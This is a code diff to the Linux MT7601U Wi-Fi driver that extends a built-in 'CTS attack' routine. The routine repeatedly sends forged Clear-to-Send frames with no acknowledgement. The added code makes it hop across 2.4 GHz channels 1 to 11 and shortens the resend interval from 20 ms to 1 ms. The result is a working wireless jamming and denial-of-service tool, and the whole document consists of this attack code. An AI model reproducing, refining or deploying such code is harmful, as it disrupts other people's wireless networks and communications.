@@ -2,6 +2,8 @@
 #include <linux/timer.h>
 #include <linux/kernel.h>
 #include <linux/ieee80211.h>
+#include <net/cfg80211.h>
+#include <linux/nl80211.h>
 #include "mt7601u.h"
 
 static const u8 CTS_Frame[] = {
@@ -10,10 +12,15 @@ static const u8 CTS_Frame[] = {
     0x7c, 0x3d, 0x09, 0x80, 0x83, 0x53, //receiver address(self)
 };
 
+static int current_channel_idx = 0;
+static const int channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
+
 static void mt7601u_cts_attack(struct mt7601u_dev *dev){
     struct sk_buff *skb;
     struct ieee80211_tx_info *info;
     struct ieee80211_tx_control control = {0};
+    struct cfg80211_chan_def chandef;
+    int channel = channels[current_channel_idx];
 
     skb = dev_alloc_skb(sizeof(CTS_Frame));
     if(!skb)    
@@ -25,7 +32,19 @@ static void mt7601u_cts_attack(struct mt7601u_dev *dev){
     info->flags |= IEEE80211_TX_CTL_NO_ACK;
     skb_set_queue_mapping(skb, 0);
     mt7601u_tx(dev->hw, &control, skb);
-    //dev_info(dev->dev, "trans success\n");
+    dev_info(dev->dev, "trans success on channel %d\n", channel);
+
+    // Switch to next channel
+    chandef.chan = ieee80211_get_channel(dev->hw->wiphy, 
+                                         ieee80211_channel_to_frequency(channel, NL80211_BAND_2GHZ));
+    if (chandef.chan) {
+        chandef.width = NL80211_CHAN_WIDTH_20;
+        chandef.center_freq1 = chandef.chan->center_freq;
+        mt7601u_phy_set_channel(dev, &chandef);
+        dev_info(dev->dev, "switched to channel %d\n", channel);
+    }
+
+    current_channel_idx = (current_channel_idx + 1) % ARRAY_SIZE(channels);
 }
 
 static void mt7601u_attack_work_handler(struct work_struct *work){
@@ -37,7 +56,7 @@ static void mt7601u_attack_work_handler(struct work_struct *work){
         return;
     }
     mt7601u_cts_attack(dev);
-    schedule_delayed_work(&dev->attack_work, msecs_to_jiffies(20));
+    schedule_delayed_work(&dev->attack_work, msecs_to_jiffies(1));//20ms default
 }
 
 static ssize_t mt7601u_attack_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
